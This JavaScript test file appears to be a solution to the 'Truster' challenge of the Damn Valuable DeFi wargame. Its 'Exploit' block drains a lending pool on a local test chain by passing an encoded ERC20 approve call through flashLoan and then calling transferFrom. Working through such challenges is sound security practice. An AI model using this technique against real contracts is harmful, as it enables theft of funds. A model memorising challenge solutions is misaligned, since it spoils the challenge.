const { ether } = require('@openzeppelin/test-helpers');
const { accounts, contract } = require('@openzeppelin/test-environment');

const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
const TrusterLenderPool = contract.fromArtifact('TrusterLenderPool');

const { expect } = require('chai');

describe('[Challenge] Truster', function () {
  const [deployer, attacker, ...otherAccounts] = accounts;

  const TOKENS_IN_POOL = ether('1000000');

  before(async function () {
    /** SETUP SCENARIO */
    this.token = await DamnValuableToken.new({ from: deployer });
    this.pool = await TrusterLenderPool.new(this.token.address, {
      from: deployer,
    });

    await this.token.transfer(this.pool.address, TOKENS_IN_POOL, {
      from: deployer,
    });

    expect(await this.token.balanceOf(this.pool.address)).to.be.bignumber.equal(
      TOKENS_IN_POOL,
    );

    expect(await this.token.balanceOf(attacker)).to.be.bignumber.equal('0');
  });

  it('Exploit', async function () {
    //var abi = parsed.abi;
    let abi = [
      {
        constant: false,
        inputs: [
          { name: '_spender', type: 'address' },
          { name: '_value', type: 'uint256' },
        ],
        name: 'approve',
        outputs: [],
        payable: false,
        stateMutability: 'nonpayable',
        type: 'function',
      },
    ];

    const { web3 } = require('@openzeppelin/test-environment');
    const myContract = new web3.eth.Contract(abi, this.token.address);
    //console.log(myContract);

    let approveAmount = TOKENS_IN_POOL;
    let approveAmountHex = web3.utils.toHex(approveAmount);
    let calldata = myContract.methods
      .approve(attacker, approveAmountHex)
      .encodeABI();
    await this.pool.flashLoan(0, attacker, this.token.address, calldata);

    // Validate approval worked
    // let approved = await this.token.allowance(this.pool.address, attacker);
    // console.log('Approved', approved.toString());

    await this.token.transferFrom(this.pool.address, attacker, TOKENS_IN_POOL, {
      from: attacker,
    });
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    expect(await this.token.balanceOf(attacker)).to.be.bignumber.equal(
      TOKENS_IN_POOL,
    );
    expect(await this.token.balanceOf(this.pool.address)).to.be.bignumber.equal(
      '0',
    );
  });
});
